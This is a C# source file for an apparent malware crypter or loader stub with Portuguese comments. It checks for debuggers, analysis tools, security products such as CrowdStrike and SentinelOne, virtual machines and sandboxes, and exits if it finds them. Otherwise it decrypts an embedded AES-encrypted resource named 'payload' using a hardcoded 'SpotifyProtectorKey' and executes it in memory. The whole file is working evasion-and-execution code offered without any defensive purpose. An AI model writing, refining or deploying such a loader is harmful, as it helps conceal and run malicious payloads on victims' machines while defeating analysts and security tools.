using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PL
{
	internal static class L
	{
		[DllImport("kernel32.dll")]
		private static extern bool IsDebuggerPresent();

		[DllImport("kernel32.dll")]
		private static extern void Sleep(uint dwMilliseconds);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		[DllImport("kernel32.dll")]
		private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		private static bool C1()
		{
			try
			{
				if (IsDebuggerPresent()) return true;
				bool flag = false;
				CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag);
				if (flag) return true;
			}
			catch { }
			return false;
		}

		private static bool C2()
		{
			try
			{
				var procs = new[] { "vmtoolsd", "vmware", "vbox", "qemu", "xen", "sandboxie", "wireshark", "fiddler", "procmon", "ollydbg", "x64dbg", "ida", "ghidra", "cheatengine", "processhacker", "taskmgr" };
				foreach (var p in Process.GetProcesses())
				{
					try
					{
						var name = p.ProcessName.ToLower();
						if (procs.Any(x => name.Contains(x))) return true;
					}
					catch { }
				}
			}
			catch { }
			return false;
		}

		private static bool C3()
		{
			try
			{
				// Só verifica processos de AV específicos que são mais agressivos em análise
				var avProcs = new[] { "sandboxie", "cuckoo", "joebox", "anubis", "norman", "fireeye", "crowdstrike", "sentinelone" };
				int count = 0;
				foreach (var p in Process.GetProcesses())
				{
					try
					{
						var name = p.ProcessName.ToLower();
						if (avProcs.Any(x => name.Contains(x.ToLower()))) count++;
						if (count >= 2) return true; // Só bloqueia se múltiplos processos suspeitos
					}
					catch { }
				}
			}
			catch { }
			return false;
		}

		private static bool C4()
		{
			try
			{
				using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
				{
					foreach (ManagementObject obj in searcher.Get())
					{
						var manufacturer = obj["Manufacturer"].ToString().ToLower();
						var model = obj["Model"].ToString().ToLower();
						if (manufacturer.Contains("vmware") || manufacturer.Contains("microsoft corporation") && model.Contains("virtual") ||
							manufacturer.Contains("innotek") || manufacturer.Contains("virtualbox") ||
							manufacturer.Contains("xen") || manufacturer.Contains("qemu") || manufacturer.Contains("bochs") ||
							model.Contains("virtualbox") || model.Contains("vmware") || model.Contains("virtual"))
							return true;
					}
				}
			}
			catch { }
			try
			{
				var suspiciousDirs = new[] { "C:\\analysis", "C:\\sandbox", "C:\\virus", "C:\\sample", "C:\\cuckoo", "C:\\joebox" };
				foreach (var dir in suspiciousDirs)
				{
					if (Directory.Exists(dir)) return true;
				}
			}
			catch { }
			try
			{
				var userName = Environment.UserName.ToLower();
				// Só bloqueia nomes muito específicos de sandbox, não "test" genérico
				if (userName.Contains("sandbox") || userName.Contains("virus") || userName.Contains("malware") || 
					userName.Contains("sample") || userName.Contains("analysis"))
					return true;
			}
			catch { }
			try
			{
				var compName = Environment.MachineName.ToLower();
				// Só bloqueia nomes muito específicos de sandbox/VM
				if (compName.Contains("sandbox") || compName.Contains("virus") || compName.Contains("malware") ||
					compName.Contains("sample") || compName.Contains("analysis"))
					return true;
			}
			catch { }
			return false;
		}

		private static void D1()
		{
			try
			{
				var rnd = new Random(Environment.TickCount);
				var delay = rnd.Next(500, 2000); // Delay reduzido para não bloquear testes
				var start = Environment.TickCount;
				while (Environment.TickCount - start < delay)
				{
					Thread.Sleep(50);
					if (rnd.Next(0, 100) > 95) Sleep(100);
				}
			}
			catch { }
		}

		private static void D2()
		{
			try
			{
				var start = DateTime.Now;
				long sum = 0;
				for (int i = 0; i < 1000000; i++) 
				{ 
					sum += i;
					if (i % 10000 == 0 && C1()) return;
				}
				var elapsed = (DateTime.Now - start).TotalMilliseconds;
				if (elapsed > 1000 || sum == 0) return;
			}
			catch { }
		}

		private static void D3()
		{
			try
			{
				var rnd = new Random(Environment.TickCount ^ 0xABCD);
				for (int i = 0; i < 5; i++) // Reduzido de 10 para 5
				{
					Thread.Sleep(rnd.Next(20, 80)); // Delay reduzido
					// Removido check interno para não bloquear desnecessariamente
				}
			}
			catch { }
		}

		private static byte[] K()
		{
			var baseStr = "SpotifyProtectorKey";
			byte[] key;
			using (var sha = SHA256.Create())
				key = sha.ComputeHash(Encoding.UTF8.GetBytes(baseStr + "|S1"));
			byte[] iv;
			using (var md5 = MD5.Create())
				iv = md5.ComputeHash(Encoding.UTF8.GetBytes(baseStr + "|S2"));
			byte[] all = new byte[key.Length + iv.Length];
			Buffer.BlockCopy(key, 0, all, 0, key.Length);
			Buffer.BlockCopy(iv, 0, all, key.Length, iv.Length);
			return all;
		}

		private static byte[] Dec(byte[] enc)
		{
			var all = K();
			var key = new byte[32];
			var iv = new byte[16];
			Buffer.BlockCopy(all, 0, key, 0, 32);
			Buffer.BlockCopy(all, 32, iv, 0, 16);
			using (var aes = Aes.Create())
			{
				aes.Mode = CipherMode.CBC;
				aes.Padding = PaddingMode.PKCS7;
				aes.Key = key;
				aes.IV = iv;
				using (var ms = new MemoryStream())
				{
					using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(enc, 0, enc.Length);
						cs.FlushFinalBlock();
					}
					return ms.ToArray();
				}
			}
		}

		[STAThread]
		private static void Main(string[] a)
		{
			try
			{
				D2();
				// Verificações menos restritivas - só bloqueia se múltiplas detecções
				bool dbg = C1();
				bool tools = C2();
				bool av = C3();
				bool vm = C4();
				
				// Só bloqueia se houver múltiplas detecções ou debug explícito
				if (dbg || (tools && (av || vm)) || (av && vm))
				{
					Environment.Exit(0);
					return;
				}
				
				D3();
				D1();
				
				// Verificação final mais leve
				if (dbg || (tools && vm))
				{
					Environment.Exit(0);
					return;
				}

				string r = typeof(L).Assembly.GetManifestResourceNames().FirstOrDefault(n => n.EndsWith("payload", StringComparison.OrdinalIgnoreCase) || n.Contains("payload"));
				if (r == null) throw new InvalidOperationException("Payload não encontrado nos recursos.");

				byte[] b;
				using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream(r))
				using (var gz = new GZipStream(s, CompressionMode.Decompress))
				using (var ms = new MemoryStream())
				{
					gz.CopyTo(ms);
					b = ms.ToArray();
				}

				b = Dec(b);

				// Verificação final mínima - só debug
				if (C1())
				{
					Environment.Exit(0);
					return;
				}

				var asm = Assembly.Load(b);
				var ep = asm.EntryPoint;
				if (ep == null) throw new InvalidOperationException("EntryPoint não encontrado no payload.");

				var ps = ep.GetParameters();
				if (ps.Length == 1 && ps[0].ParameterType == typeof(string[]))
				{
					var args = Environment.GetCommandLineArgs().Skip(1).ToArray();
					ep.Invoke(null, new object[] { args });
				}
				else
				{
					ep.Invoke(null, null);
				}
			}
			catch (Exception ex)
			{
				try { MessageBox.Show("Falha ao iniciar aplicação protegida:\n" + ex.Message, "", MessageBoxButtons.OK, MessageBoxIcon.Error); } catch { }
			}
		}
	}
}
